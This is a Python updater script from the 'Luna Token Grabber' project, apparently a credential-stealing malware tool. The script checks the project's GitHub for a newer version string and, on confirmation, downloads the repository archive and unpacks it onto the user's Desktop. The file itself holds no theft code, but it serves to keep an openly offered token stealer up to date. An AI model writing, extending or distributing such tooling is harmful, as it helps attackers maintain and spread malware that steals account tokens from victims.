import os
from time import sleep
from zipfile import ZipFile

import requests


def check_update():
    version_string = "VERSION = '1.2.4'"
    code = requests.get('https://raw.githubusercontent.com/Smug246/Luna-Token-Grabber/main/builder.pyw').text
    if version_string in code:
        print('This version is up to date!')
        print('Exiting...')
        sleep(2)
        exit()
    else:
        print('''
                ███╗   ██╗███████╗██╗    ██╗    ██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗██╗
                ████╗  ██║██╔════╝██║    ██║    ██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║
                ██╔██╗ ██║█████╗  ██║ █╗ ██║    ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗  ██║
                ██║╚██╗██║██╔══╝  ██║███╗██║    ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝  ╚═╝
                ██║ ╚████║███████╗╚███╔███╔╝    ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗██╗
                ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝
                                  Your version of Luna Token Grabber is outdated!''')
        choice = input('\nWould you like to update? (y/n): ')
        if choice.lower() == 'y':
            new_version_source = requests.get('https://github.com/Smug246/Luna-Token-Grabber/archive/refs/heads/main.zip')
            with open("Luna-Token-Grabber-main.zip", 'wb')as zipfile:
                zipfile.write(new_version_source.content)
            with ZipFile("Luna-Token-Grabber-main.zip", 'r') as filezip:
                filezip.extractall(path=os.path.join(os.path.expanduser("~"), "Desktop"))
            os.remove("Luna-Token-Grabber-main.zip")
            print('The new version is now on your desktop.\nUpdate Complete!')
            print("Exiting...")
            sleep(5)
        if choice.lower() == 'n':
            print('Exiting...')
            sleep(2)
            exit()


if __name__ == '__main__':
    check_update()
